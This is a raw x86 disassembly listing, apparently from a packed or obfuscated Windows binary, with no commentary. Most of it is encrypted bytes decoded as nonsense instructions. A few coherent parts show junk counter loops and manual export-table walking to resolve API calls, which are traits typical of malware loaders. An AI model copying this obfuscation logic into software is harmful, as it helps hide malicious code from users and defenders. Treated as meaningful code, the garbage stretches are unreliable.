  41412a:	sbb    BYTE PTR [ebp+0x7f],0xa9
  41412e:	test   BYTE PTR [edx],al
  414130:	xor    al,0xae
  414132:	or     DWORD PTR [edi-0x7d74729e],esi
  414138:	cmc    
  414139:	(bad)  
  41413a:	xor    eax,edi
  41413c:	or     eax,0xae807556
  414141:	pop    ss
  414142:	jne    0x41417c
  414144:	inc    eax
  414145:	loop   0x4141b4
  414147:	mov    bh,0xd5
  414149:	scas   al,BYTE PTR es:[edi]
  41414a:	fdiv   DWORD PTR [eax+0x36]
  41414d:	out    0x93,al
  41414f:	cmp    eax,0x66b609a8
  414154:	cmp    al,0xfa
  414156:	push   esi
  414157:	add    DWORD PTR [eax-0x27],ebp
  41415a:	inc    edx
  41415b:	in     eax,dx
  41415c:	push   0xec458b93
  414161:	and    DWORD PTR ds:0x42fd55,0x0
  41416b:	mov    ecx,DWORD PTR ds:0x42fd55
  414171:	inc    ecx
  414172:	mov    DWORD PTR ds:0x42fd55,ecx
  414178:	cmp    DWORD PTR ds:0x42fd55,0x2c
  41417f:	jne    0x41418b
  414185:	call   DWORD PTR ds:0x42e5ef
  41418b:	cmp    DWORD PTR ds:0x42fd55,0x1e
  414192:	jb     0x41416b
  414198:	mov    ecx,DWORD PTR [ebp+0x8]
  41419b:	or     DWORD PTR ds:0x42fd59,0x46b9
  4141a5:	add    ecx,DWORD PTR [eax+0x20]
  4141a8:	mov    DWORD PTR [ebp-0x28],ecx
  4141ab:	or     eax,DWORD PTR ds:0x42e77f
  4141b1:	mov    eax,DWORD PTR [ebp-0x14]
  4141b4:	mov    ecx,DWORD PTR ds:0x42fd69
  4141ba:	sbb    DWORD PTR ds:0x42fd55,ecx
  4141c0:	mov    ecx,DWORD PTR [ebp+0x8]
  4141c3:	add    DWORD PTR ds:0x42fd85,0x42e793
  4141cd:	add    ecx,DWORD PTR [eax+0x24]
  4141d0:	add    DWORD PTR ds:0x42e76b,edi
  4141d6:	mov    DWORD PTR [ebp-0x2c],ecx
  4141d9:	mov    eax,DWORD PTR [ebp-0x14]
  4141dc:	mov    ecx,DWORD PTR [ebp+0x8]
  4141df:	add    ecx,DWORD PTR [eax+0x1c]
  4141e2:	neg    eax
  4141e4:	xor    esi,esi
  4141e6:	and    DWORD PTR ds:0x42fd85,ebx
  4141ec:	mov    DWORD PTR [ebp-0x14],ecx
  4141ef:	or     DWORD PTR ds:0x42e78f,ecx
  4141f5:	mov    eax,DWORD PTR [ebp-0x28]
  4141f8:	and    DWORD PTR ds:0x42fd5d,0x0
  414202:	mov    ecx,DWORD PTR ds:0x42fd5d
  414208:	inc    ecx
  414209:	mov    DWORD PTR ds:0x42fd5d,ecx
  41420f:	cmp    DWORD PTR ds:0x42fd5d,0xc
  414216:	jne    0x41423b
  41421c:	push   DWORD PTR [ebp-0x18]
  41421f:	push   DWORD PTR [ebp-0x10]
  414222:	push   0x25b2
  414227:	push   DWORD PTR [ebp-0x10]
  41422a:	push   0x5d78
  41422f:	push   DWORD PTR [ebp-0x24]
  414232:	push   DWORD PTR [ebp-0x10]
  414235:	call   DWORD PTR ds:0x42e5f3
  41423b:	cmp    DWORD PTR ds:0x42fd5d,0xb
  414242:	jne    0x414257
  414248:	xor    ecx,ecx
  41424a:	add    ecx,DWORD PTR ds:0x42fd5d
  414250:	inc    ecx
  414251:	mov    DWORD PTR ds:0x42fd5d,ecx
  414257:	cmp    DWORD PTR ds:0x42fd5d,0x14
  41425e:	jb     0x414202
  414264:	mov    ecx,DWORD PTR [ebp+0x8]
  414267:	add    ecx,DWORD PTR [eax+edi*4]
  41426a:	lea    eax,[ebp-0x8]
  41426d:	mov    DWORD PTR [ebp-0x30],ecx
  414270:	push   eax
  414271:	jmp    0x414555
  414276:	add    ebx,0xffffff97
  414279:	xor    eax,0x71a17157
  41427e:	inc    edx
  41427f:	cld    
  414280:	xchg   ebx,eax
  414281:	loop   0x414241
  414283:	xchg   esp,eax
  414284:	stc    
  414285:	or     al,BYTE PTR [eax-0x468f8f8d]
  41428b:	jle    0x4142fd
  41428d:	jo     0x41429c
  41428f:	cld    
  414290:	mov    ds:0xb80340a2,al
  414295:	int    0x8a
  414297:	aaa    
  414298:	mov    BYTE PTR [eax],0x22
  41429b:	pop    esp
  41429c:	ins    BYTE PTR es:[edi],dx
  41429d:	push   cs
  41429e:	mov    bl,0xbf
  4142a0:	dec    ebp
  4142a1:	ins    DWORD PTR es:[edi],dx
  4142a2:	(bad)  
  4142a3:	xchg   esi,eax
  4142a4:	out    0xe4,al
  4142a6:	std    
  4142a7:	jp     0x4142be
  4142a9:	and    cl,BYTE PTR [esi+0x471546f6]
  4142af:	xchg   edi,eax
  4142b0:	push   ebx
  4142b1:	mov    eax,0x57d7b4f0
  4142b6:	add    al,dh
  4142b8:	xchg   BYTE PTR [ebx+ebp*2+0x4066d5a0],dh
  4142bf:	cmp    al,0xd4
  4142c1:	lods   al,BYTE PTR ds:[esi]
  4142c2:	addr16 mov cl,0x86
  4142c5:	aas    
  4142c6:	std    
  4142c7:	ret    
  4142c8:	pop    ss
  4142c9:	call   0xdf03e452
  4142ce:	inc    esp
  4142cf:	pusha  
  4142d0:	jno    0x41427f
  4142d2:	test   BYTE PTR [ebp+0x7f756ba0],bl
  4142d8:	cmp    eax,0x689b32c3
  4142dd:	pop    esp
  4142de:	hlt    
  4142df:	fdivr  st,st(1)
  4142e1:	push   esi
  4142e2:	cmp    dh,BYTE PTR [esi-0x6488978b]
  4142e8:	inc    esp
  4142e9:	and    bh,BYTE PTR [ebx-0x41]
  4142ec:	imul   eax,DWORD PTR [ebp-0x3218190f],0x89ab3c71
  4142f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4142f7:	fwait
  4142f8:	jmp    0xe2bdf394
  4142fd:	int3   
  4142fe:	xor    al,0xb9
  414300:	popf   
  414301:	sub    al,0x38
  414303:	fdivrp st(1),st
  414305:	mov    esp,0xa8898ba2
  41430a:	mov    ebp,0x6c6610c4
  41430f:	iret   
  414310:	fisub  WORD PTR [ebp-0x57]
  414313:	mul    BYTE PTR [esp+edi*4-0x187c3a8a]
  41431a:	sub    DWORD PTR [eax],0x4534701b
  414320:	pop    ecx
  414321:	push   ecx
  414322:	mov    ?,WORD PTR ds:0x57677318
  414328:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414329:	push   es
  41432a:	das    
  41432b:	stos   BYTE PTR es:[edi],al
  41432c:	mov    cl,0x41
  41432e:	sub    BYTE PTR [esi-0x453de6e0],bl
  414334:	sbb    eax,0xc899d054
  414339:	popa   
  41433a:	dec    esi
  41433b:	xor    al,0x96
  41433d:	pop    ebp
  41433e:	in     eax,0xad
  414340:	lea    ecx,[esi]
  414342:	or     eax,0x25513024
  414347:	cmp    eax,0x3a23faf
  41434c:	add    ch,BYTE PTR [edi+0x5d]
  41434f:	jbe    0x4142e2
  414351:	call   0x9ab43c4e
  414356:	cmp    bh,ah
  414358:	fs (bad) 
  41435a:	fdiv   QWORD PTR [ecx+0x2c446dc1]
  414360:	std    
  414361:	sbb    ah,BYTE PTR [edx+0x12]
  414364:	bound  ecx,QWORD PTR [ebx]
  414366:	xor    cl,ch
  414368:	or     DWORD PTR [edx],ebp
  41436a:	push   ebx
  41436b:	das    
  41436c:	adc    DWORD PTR [ecx],edx
  41436e:	test   DWORD PTR [ecx],edx
  414370:	xchg   esp,eax
  414371:	inc    ecx
  414372:	cmp    BYTE PTR [ecx-0x21889391],0x73
  414379:	retf   0xa976
  41437c:	sub    cl,BYTE PTR [edi-0x52aab561]
  414382:	cdq    
  414383:	std    
  414384:	outs   dx,BYTE PTR ds:[esi]
  414385:	repz mov bl,0x35
  414388:	push   ebp
  414389:	aad    0x8a
  41438b:	inc    eax
  41438c:	or     al,0xb3
  41438e:	push   esi
  41438f:	or     eax,0xe600f9a0
  414394:	mov    al,BYTE PTR [esp+ebx*8-0x7cb504c0]
  41439b:	pop    eax
  41439c:	inc    esi
  41439d:	push   ss
  41439e:	inc    ebx
  41439f:	sahf   
  4143a0:	add    BYTE PTR [ecx-0x243f78c8],al
  4143a6:	dec    ebp
  4143a7:	push   esi
  4143a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4143a9:	adc    al,0xf8
  4143ab:	inc    ebx
  4143ac:	adc    bl,al
  4143ae:	outs   dx,DWORD PTR ds:[esi]
  4143af:	out    0x8b,al
  4143b1:	stos   BYTE PTR es:[edi],al
  4143b2:	outs   dx,BYTE PTR ds:[esi]
  4143b3:	mov    ds:0xbccb52b5,eax
  4143b8:	fistp  QWORD PTR [eax+0x23]
  4143bb:	mov    dh,0xd0
  4143bd:	inc    esi
  4143be:	mov    ah,0xc8
  4143c0:	mov    eax,0xcf5d8a98
  4143c5:	push   edi
  4143c6:	add    bl,ch
  4143c8:	or     esp,DWORD PTR [eax+edx*2]
  4143cb:	mov    ebx,edi
  4143cd:	into   
  4143ce:	jne    0x414430
  4143d0:	outs   dx,DWORD PTR ds:[esi]
  4143d1:	add    eax,0x46419b0a
  4143d6:	pop    es
  4143d7:	(bad)  
  4143d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4143d9:	stos   DWORD PTR es:[edi],eax
  4143da:	jmp    0xf948574c
  4143df:	sbb    bh,dh
  4143e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4143e2:	jmp    0x414448
  4143e4:	cmc    
  4143e5:	(bad)  
  4143e6:	cmpxchg BYTE PTR es:[ecx-0x19],ah
  4143eb:	pop    ds
  4143ec:	out    0xcd,al
  4143ee:	cwde   
  4143ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4143f0:	fcom   QWORD PTR [ecx+0x7e]
  4143f3:	icebp  
  4143f4:	xchg   edx,eax
  4143f5:	push   ebx
  4143f6:	popf   
  4143f7:	and    eax,0x636829aa
  4143fc:	push   esp
  4143fd:	stos   BYTE PTR es:[edi],al
  4143fe:	adc    bh,BYTE PTR [edi-0x59]
  414401:	aam    0x5f
  414403:	pop    edi
  414404:	in     al,0xdf
  414406:	outs   dx,DWORD PTR ds:[esi]
  414407:	pop    esi
  414408:	inc    BYTE PTR [ebp-0x17ad9b0a]
  41440e:	dec    edx
  41440f:	fcmovnbe st,st(5)
  414411:	cmp    eax,0x9014439c
  414416:	jbe    0x41448a
  414418:	and    eax,0xfeb277fa
  41441d:	lods   al,BYTE PTR ds:[esi]
  41441e:	sub    al,0xf9
  414420:	popf   
  414421:	imul   ebp,DWORD PTR [ebx],0x11
  414424:	dec    esp
  414425:	mov    bl,0x5e
  414427:	das    
  414428:	and    edx,DWORD PTR [ebx]
  41442a:	out    dx,eax
  41442b:	mov    ds:0xdf9cd0f5,ax
  414431:	rcr    DWORD PTR [edx-0x3a28092],0x31
  414438:	lahf   
  414439:	sub    al,0xe6
  41443b:	sub    bl,bl
  41443d:	dec    esp
  41443e:	leave  
  41443f:	test   BYTE PTR [edi],ch
  414441:	popf   
  414442:	outs   dx,DWORD PTR ds:[esi]
  414443:	add    DWORD PTR [ecx-0x4e53faa6],0xffffffe5
  41444a:	test   edx,0x569cc4e9
  414450:	test   eax,0x83399ae2
  414455:	and    DWORD PTR [ecx+0x7c],0x77
  414459:	or     eax,0xce966b46
  41445e:	loopne 0x414460
  414460:	dec    esi
  414461:	cld    
  414462:	data16 jle 0x4144a9
  414465:	stos   DWORD PTR es:[edi],eax
  414466:	ror    DWORD PTR [edi+0x3b3dc8aa],1
  41446c:	jp     0x4143f4
  41446e:	out    0xed,al
  414470:	xchg   ebx,eax
  414471:	enter  0xa860,0xf7
  414475:	cwde   
  414476:	std    
  414477:	or     esi,DWORD PTR [eax-0x47]
  41447a:	mov    esi,0xd7d8399c
  41447f:	cmp    DWORD PTR [ecx],edi
  414481:	xlat   BYTE PTR ds:[ebx]
  414482:	xchg   edx,eax
  414483:	pop    ecx
  414484:	jge    0x414472
  414486:	mov    edi,ebx
  414488:	test   eax,0x38d23853
  41448d:	sbb    BYTE PTR [edi],ah
  41448f:	pop    ebp
  414490:	pop    esp
  414491:	popa   
  414492:	adc    ch,BYTE PTR [edi+0x6d5cbad8]
  414498:	repnz test dl,0x1
  41449c:	sub    bl,BYTE PTR [esi]
  41449e:	sbb    DWORD PTR [eax],eax
  4144a0:	outs   dx,DWORD PTR ds:[esi]
  4144a1:	rcl    bl,cl
  4144a3:	pop    es
  4144a4:	jo     0x414461
  4144a6:	add    dl,BYTE PTR [esi]
  4144a8:	xor    ch,ah
  4144aa:	inc    ebp
  4144ab:	sbb    edi,edx
  4144ad:	dec    ebx
  4144ae:	mul    DWORD PTR [edi]
  4144b0:	xlat   BYTE PTR ds:[ebx]
  4144b1:	imul   ebp,DWORD PTR [esi+0x6c],0xffffffce
  4144b5:	gs mov esi,eax
  4144b8:	add    eax,0xf31f7ab4
  4144bd:	push   dx
  4144bf:	inc    DWORD PTR [esi-0x74]
  4144c2:	loope  0x41447d
  4144c4:	test   edx,0x7aee6b1
  4144ca:	mov    eax,ds:0x296811d7
  4144cf:	cmp    edi,DWORD PTR [eax-0x51ca4187]
  4144d5:	ins    DWORD PTR es:[edi],dx
  4144d6:	sbb    eax,0xeb0dbe2f
  4144db:	jb     0x4144bd
  4144dd:	pop    esi
  4144de:	add    eax,0x9b1e9545
  4144e3:	or     esp,ebp
  4144e5:	fsubr  st(2),st
  4144e7:	sbb    edi,DWORD PTR [ebp+0x1883e44b]
  4144ed:	les    esp,FWORD PTR [eax-0x51ede280]
  4144f3:	pushf  
  4144f4:	adc    eax,0xb264f3f0
  4144f9:	dec    ebp
  4144fa:	adc    BYTE PTR [edx],0xa9
  4144fd:	outs   dx,BYTE PTR ds:[esi]
  4144fe:	cmp    BYTE PTR [edi+0x14],dl
  414501:	dec    ebx
  414502:	ret    
  414503:	cdq    
  414504:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414505:	mov    esp,0xa2932b53
  41450a:	sub    bl,BYTE PTR [edi+0x788896c2]
  414510:	out    dx,eax
  414511:	nop
  414512:	push   0x3f
  414514:	add    al,0x7d
  414516:	mov    ds:0x8b8b3e09,al
  41451b:	or     al,0xa7
  41451d:	jne    0x414598
  41451f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414520:	dec    eax
  414521:	cdq    
  414522:	push   0x8671a006
  414527:	push   edi
  414528:	push   eax
  414529:	push   ds
  41452a:	jmp    0x414559
  41452c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41452d:	aam    0xe5
  41452f:	arpl   WORD PTR [ebp+0x60],sp
  414532:	push   ss
  414533:	sub    ah,BYTE PTR [ecx+ebp*2]
  414536:	adc    DWORD PTR [ebx+0x1b],0x71ed2aa7
  41453d:	inc    eax
  41453e:	scas   al,BYTE PTR es:[edi]
  41453f:	inc    dl
  414541:	and    BYTE PTR [ebx],ah
  414543:	ds cld 
  414545:	mov    dl,0xc2
  414547:	or     al,0x78
  414549:	inc    ecx
  41454a:	inc    esi
  41454b:	ins    DWORD PTR es:[edi],dx
  41454c:	ror    DWORD PTR [edi],0x4c
  41454f:	std    
  414550:	cs fmul st,st(3)
  414553:	cmp    esi,ebp
  414555:	push   DWORD PTR [ebp-0x30]
  414558:	push   DWORD PTR [ebp+0xc]
  41455b:	call   0x4036c0
  414560:	mov    eax,DWORD PTR [ebp-0x4]
  414563:	jmp    0x414847
  414568:	ret    
  414569:	sbb    al,0xfd
  41456b:	sub    BYTE PTR [ebp-0x4f],ah
  41456e:	jno    0x41455b
  414570:	pop    ebx
  414571:	or     eax,0x9facbeb4
  414576:	lahf   
  414577:	in     al,0xc9
  414579:	jo     0x4145fa
  41457b:	jo     0x414536
  41457d:	jle    0x4145ef
  41457f:	jo     0x4145f7
  414581:	cdq    
  414582:	jmp    0xb016:0x9907b310
  414589:	pop    ebx
  41458a:	or     al,0xbf
  41458c:	push   esp
  41458d:	add    al,0x91
  41458f:	and    eax,0x32616aa1
  414594:	(bad)  
  414595:	mov    al,0x8e
  414597:	jge    0x414578
  414599:	sbb    BYTE PTR [ecx+0x760fc56a],cl
  41459f:	out    0xe,al
  4145a1:	cwde   
  4145a2:	adc    al,0xe6
  4145a4:	repnz cmp eax,0x57fc4f8f
  4145aa:	outs   dx,BYTE PTR ds:[esi]
  4145ab:	lahf   
  4145ac:	xchg   edx,eax
  4145ad:	push   0x90701cec
  4145b2:	adc    BYTE PTR ds:0x5831e24e,cl
  4145b8:	mov    edi,0x33efb139
  4145bd:	or     bh,BYTE PTR [ecx]
  4145bf:	pusha  
  4145c0:	div    DWORD PTR [ebx+0x61]
  4145c3:	xchg   ebp,eax
  4145c4:	psubd  mm3,QWORD PTR [ebp-0x4c3b6f59]
  4145cb:	nop
  4145cc:	cs (bad) 
  4145ce:	sti    
  4145cf:	add    DWORD PTR [ebp+0x4a],0xcefebce4
  4145d6:	scas   eax,DWORD PTR es:[edi]
  4145d7:	into   
  4145d8:	push   eax
  4145d9:	test   ebp,0x7f526010
  4145df:	cmp    al,0x25
  4145e1:	mov    dl,0xa
  4145e3:	ja     0x4145e6
  4145e5:	gs push ss
  4145e7:	outs   dx,DWORD PTR ds:[esi]
  4145e8:	mov    al,0x7c
  4145ea:	xor    ah,BYTE PTR [ecx]
  4145ec:	jno    0x41465f
  4145ee:	jo     0x414640
  4145f0:	push   edi
  4145f1:	pop    eax
  4145f2:	dec    edi
  4145f3:	cmp    ebp,edi
  4145f5:	imul   edx,DWORD PTR [ebp+0x5f3b7ca9],0xffffffbf
  4145fc:	dec    edi
  4145fd:	pusha  
  4145fe:	pushf  
  4145ff:	mov    eax,ds:0x1fe208f9
  414604:	push   0xffffffac
  414606:	dec    esi
  414607:	pop    ebx
  414608:	(bad)  
  41460a:	pop    ebp
  41460b:	xor    DWORD PTR [ebp-0x1434245],ecx
  414611:	aam    0x5e
  414613:	adc    BYTE PTR [esi],ah
  414615:	dec    ebp
  414616:	sbb    ch,bh
  414618:	fcomp  DWORD PTR [esi]
  41461a:	sub    DWORD PTR ds:0xea8ca26b,edi
  414620:	xchg   ebp,eax
  414621:	xor    dh,BYTE PTR [ebp+0x250aa5a2]
  414627:	retf   
  414628:	mov    edx,0xbf43bd89
  41462d:	jmp    0x414628
  41462f:	or     eax,0x7229213c
  414634:	push   cs
  414635:	push   esp
  414636:	imul   esi,DWORD PTR [esi-0x1bd04ed2],0xffffffbf
  41463d:	dec    esp
  41463e:	cwde   
  41463f:	sbb    DWORD PTR [eax+0x5a],esp
  414642:	mov    ah,0x9f
  414644:	ja     0x414606
  414646:	mov    edx,0xe9c45286
  41464b:	mov    WORD PTR [edx],fs
  41464d:	fidivr DWORD PTR [edx-0x55]
  414650:	enter  0x1d7f,0x20
  414654:	jl     0x414693
  414656:	lds    ebp,FWORD PTR [esi]
  414658:	jp     0x4146c6
  41465a:	daa    
  41465b:	push   edi
  41465c:	stc    
  41465d:	(bad)  
  41465f:	aad    0xd1
  414661:	xor    BYTE PTR [eax+0x5f],ah
  414664:	psrlq  mm4,mm3
  414667:	dec    edi
  414668:	sub    al,0xac
  41466a:	scas   al,BYTE PTR es:[edi]
  41466b:	data16 adc al,0x4c
  41466e:	add    ebp,DWORD PTR [ecx-0x641e7bb1]
  414674:	jle    0x414651
  414676:	sub    ch,BYTE PTR [edi]
  414678:	pop    es
  414679:	fiadd  DWORD PTR [esi-0x5c]
  41467c:	lock jmp 0x7997:0x9db209e7
  414684:	xchg   esp,eax
  414685:	or     ebx,0xffffffbd
  414688:	mov    al,0xa1
  41468a:	sbb    eax,0x233fc9d6
  41468f:	repz shl DWORD PTR [eax+0x3156c00f],0x99
  414697:	xor    DWORD PTR [edx-0x6],ebp
  41469a:	pushf  
  41469b:	repz (bad) 
  41469e:	push   ds
  41469f:	jno    0x414697
  4146a1:	out    0x4d,eax
  4146a3:	add    al,bh
  4146a5:	mov    dl,0xfb
  4146a7:	repz sbb bl,bh
  4146aa:	mov    WORD PTR [ebx],ds
  4146ac:	mov    ah,0xb6
  4146ae:	mov    dh,0x46
  4146b0:	inc    ebp
  4146b1:	aad    0x94
  4146b3:	es ins DWORD PTR es:[edi],dx
  4146b5:	inc    eax
  4146b6:	dec    esp
  4146b7:	test   BYTE PTR [ecx],ch
  4146b9:	imul   ecx,ecx,0x5f
  4146bc:	cmp    ch,ah
  4146be:	dec    ecx
  4146bf:	sub    bh,BYTE PTR [ecx+0x6b]
  4146c2:	popa   
  4146c3:	imul   esi,DWORD PTR [ebp-0x13],0x93d11c64
  4146ca:	jmp    0x414700
  4146cc:	aad    0x4
  4146ce:	fsubr  QWORD PTR [eax+0xa]
  4146d1:	int3   
  4146d2:	(bad)  
  4146d3:	mov    esi,0xde54c67b
  4146d8:	push   ss
  4146d9:	in     al,0x16
  4146db:	jae    0x41472e
  4146dd:	mov    ecx,0xae52d020
  4146e2:	ret    
  4146e3:	jnp    0x4146ec
  4146e5:	iret   
  4146e6:	pushf  
  4146e7:	mov    ch,0x8f
  4146e9:	int3   
  4146ea:	adc    esi,DWORD PTR [edx+eax*8]
  4146ed:	xor    eax,0x9d32ff01
  4146f2:	pop    es
  4146f3:	sbb    al,dh
  4146f5:	dec    ebx
  4146f6:	pop    esi
  4146f7:	out    0x17,eax
  4146f9:	call   0xe6270fd1
  4146fe:	outs   dx,DWORD PTR ds:[esi]
  4146ff:	jae    0x414710
  414701:	mov    ch,0x79
  414703:	sbb    BYTE PTR [edi+0x38],cl
  414706:	mov    eax,0x96439942
  41470b:	mov    bh,0xa9
  41470d:	loop   0x4146d2
  41470f:	add    esi,DWORD PTR [ebx+eiz*1-0x1d23adfb]
  414716:	xchg   al,ch
  414718:	sub    DWORD PTR [ebx+eax*4-0x3],esp
  41471c:	push   cs
  41471d:	mov    WORD PTR [eax],?
  41471f:	lea    esp,[bp+di]
  414722:	mov    al,ds:0x54e79c45
  414727:	xchg   ebp,eax
  414728:	retf   0x69a
  41472b:	cmp    DWORD PTR [ebx],ebx
  41472d:	push   esp
  41472e:	jns    0x414783
  414730:	imul   esp,DWORD PTR [edx+0x9],0x56e2b518
  414737:	ret    
  414738:	aam    0x66
  41473a:	std    
  41473b:	call   DWORD PTR [eax+0x48]
  41473e:	push   ecx
  41473f:	cmp    DWORD PTR [ecx+ebx*2],0x25889bda
  414746:	cmp    bl,BYTE PTR [ecx]
  414748:	and    ch,dh
  41474a:	iret   
  41474b:	jno    0x414700
  41474d:	test   al,0xd1
  41474f:	jnp    0x41476d
  414751:	lea    esp,[edx+esi*8-0x43]
  414755:	mov    ebx,0x72133333
  41475a:	out    0xe6,eax
  41475c:	add    DWORD PTR [edx],0xdc7d5a7
  414762:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414763:	inc    eax
  414764:	push   ebp
  414765:	ja     0x4147e1
  414767:	mov    ecx,0xdf0aa06
  41476c:	pop    edi
  41476d:	out    0x99,al
  41476f:	icebp  
  414770:	cmp    dh,BYTE PTR [ecx]
  414772:	inc    ecx
  414773:	xor    dl,BYTE PTR [esi+0x6efa7eee]
  414779:	mov    edi,0x806e5b23
  41477e:	sbb    DWORD PTR [edi-0x27],edx
  414781:	adc    DWORD PTR [edx],esp
  414783:	test   eax,0xcec65677
  414788:	xor    ch,BYTE PTR [esp+ebx*4-0x7e]
  41478c:	push   ebx
  41478d:	push   ecx
  41478e:	sub    DWORD PTR [edx+0x66],eax
  414791:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414792:	or     eax,0xe1266a6e
  414797:	into   
  414798:	pop    esp
  414799:	add    esp,ecx
  41479b:	xchg   edi,eax
  41479c:	xchg   esp,eax
  41479d:	bound  edi,QWORD PTR [edx+0x6a5b49e6]
  4147a3:	jl     0x414763
  4147a5:	jmp    0xa9515ee4
  4147aa:	test   eax,0xcb3f5d56
  4147af:	push   ss
  4147b0:	mov    ecx,0x511fc8fa
  4147b5:	shl    edx,cl
  4147b7:	test   BYTE PTR fs:[ebp-0x3d00932],ch
  4147be:	sub    DWORD PTR [ebp-0x71],edx
  4147c1:	inc    ebp
  4147c2:	int    0x89
  4147c4:	lock js 0x414840
  4147c7:	mov    eax,0xda7d67a1
  4147cc:	int3   
  4147cd:	popa   
  4147ce:	popa   
  4147cf:	push   cs
  4147d0:	lea    edi,[ebx]
  4147d2:	xor    BYTE PTR [esi+0x5f3ec2d5],cl
  4147d8:	(bad)  
  4147d9:	cmc    
  4147da:	stos   DWORD PTR es:[edi],eax
  4147db:	(bad)  
  4147dc:	ret    0x44
  4147df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4147e0:	pop    ecx
  4147e1:	mov    ds:0xdb7740e9,eax
  4147e6:	dec    ebx
  4147e7:	xor    al,0xe7
  4147e9:	test   esp,edx
  4147eb:	xchg   edi,eax
  4147ec:	sbb    eax,0xc92d3a2b
  4147f1:	inc    esp
  4147f2:	test   BYTE PTR [edx],bh
  4147f4:	push   0xffffffc2
  4147f6:	xchg   BYTE PTR [ebp-0x77887fe1],ah
  4147fc:	shl    BYTE PTR [edx+ebx*2+0x2b],cl
  414800:	sbb    al,0x11
  414802:	in     eax,0x95
  414804:	jge    0x4147ba
  414806:	sub    eax,0x79a1c265
  41480b:	call   0x61bb3ca0
  414810:	call   0x7585:0xfedb82fa
  414817:	fs dec ecx
  414819:	(bad)  
  41481a:	mov    eax,ds:0x1117531d
  41481f:	xchg   edi,eax
  414820:	aad    0x99
  414822:	loope  0x414889
  414824:	fcomp  DWORD PTR [esi+0x75]
  414827:	aaa    
  414828:	push   0xffffffab
  41482a:	cmp    ah,ch
  41482c:	or     eax,0x732cf84d
  414831:	fcomp  DWORD PTR [edi-0x3d]
  414834:	mov    BYTE PTR [ebx-0x14],ah
  414837:	xor    ecx,DWORD PTR [ebp+0x2a50da9d]
  41483d:	in     eax,0x66
  41483f:	cmp    eax,0x3e6db2c1
  414844:	or     eax,0x4d8bb3c8
  414849:	clc    
  41484a:	xor    eax,0x7510855
  41484f:	jmp    0x414b33
  414854:	add    eax,0xd5abd630
  414859:	mov    cl,0x61
  41485b:	jb     0x41489c
  41485d:	jge    0x41481b
  41485f:	jge    0x414850
  414861:	(bad)  
  414862:	popf   
  414863:	pop    ss
  414864:	adc    bh,BYTE PTR [ebp+0x7f]
  414867:	jo     0x414822
  414869:	jle    0x4148db
  41486b:	jo     0x41482b
  41486d:	dec    ecx
  41486e:	out    dx,al
  41486f:	or     al,0xe3
  414871:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414872:	dec    ebp
  414873:	xor    esp,DWORD PTR [ebx]
  414875:	or     esi,DWORD PTR [edi]
  414877:	fs push ebx
  414879:	(bad)  
  41487b:	outs   dx,BYTE PTR ds:[esi]
  41487c:	enter  0x9498,0x44
  414880:	imul   eax,DWORD PTR [edi+0x1de43bb7],0xffffffe5
  414887:	das    
  414888:	out    0x1b,eax
  41488a:	xchg   ebx,eax
  41488b:	inc    edx
  41488c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41488d:	pause  
  41488f:	loopne 0x4148db
  414891:	mov    ebp,0x4e2d57f2
  414896:	mov    ds:0xe4ef6734,al
  41489b:	sbb    BYTE PTR [ebp+0x64],cl
  41489e:	in     al,0x48
  4148a0:	fld    st(5)
  4148a2:	sub    eax,0x856d5d3d
  4148a7:	lea    ebp,[eax-0x41]
  4148aa:	push   ds
  4148ab:	jge    0x4148ac
  4148ad:	out    0xae,al
  4148af:	inc    ebp
  4148b0:	into   
  4148b1:	out    0xa9,al
  4148b3:	dec    ecx
  4148b4:	add    ah,0xe4
  4148b7:	in     eax,0x21
  4148b9:	push   ecx
  4148ba:	sbb    BYTE PTR [ebp+0xc],cl
  4148bd:	ficom  WORD PTR ds:0xe7f026f4
  4148c3:	icebp  
  4148c4:	dec    eax
  4148c5:	mov    esi,0x311ef1d0
  4148ca:	cs xor eax,0x22cca95e
  4148d0:	cmp    dl,ch
  4148d2:	mov    BYTE PTR [edx+esi*1],bl
  4148d5:	lods   al,BYTE PTR ds:[esi]
  4148d6:	dec    esi
  4148d7:	sub    ebp,ebx
  4148d9:	sub    BYTE PTR [esi-0x73482d78],bh
  4148df:	push   eax
  4148e0:	cmc    
  4148e1:	sub    DWORD PTR [esi+0x45],esi
  4148e4:	ins    BYTE PTR es:[edi],dx
  4148e5:	popf   
  4148e6:	test   BYTE PTR [edx],0x28
  4148e9:	mov    eax,ebx
  4148eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4148ec:	and    cl,BYTE PTR [ecx-0x76f51f5f]
  4148f2:	or     al,0x2c
  4148f4:	enter  0x42fc,0x2
  4148f8:	mov    DWORD PTR [ecx-0x62],ebx
  4148fb:	inc    ebx
  4148fc:	xor    DWORD PTR [edx],esp
  4148fe:	in     al,dx
  4148ff:	outs   dx,DWORD PTR ds:[esi]
  414900:	stc    
  414901:	jg     0x41490c
  414903:	ss (bad) 
  414905:	outs   dx,BYTE PTR ds:[esi]
  414906:	xor    eax,DWORD PTR [edx]
  414908:	jns    0x414956
  41490a:	add    edi,eax
  41490c:	mov    ah,0x8
  41490e:	xchg   BYTE PTR [ebx+eiz*2-0x266b559],bl
  414915:	pop    ebx
  414916:	inc    eax
  414917:	add    esi,eax
  414919:	mov    edi,0xf8cfb6d0
  41491e:	shr    BYTE PTR [esi+ecx*2],1
  414921:	sar    DWORD PTR [edi+0x2c],0x3b
  414925:	in     al,dx
  414926:	inc    ebx
  414927:	xchg   ebx,eax
  414928:	ins    BYTE PTR es:[edi],dx
  414929:	push   ebp
  41492a:	xor    ah,BYTE PTR ds:0xebd8fe01
  414930:	dec    ebx
  414931:	jecxz  0x41492b
  414933:	aas    
  414934:	popf   
  414935:	add    ah,BYTE PTR [ecx]
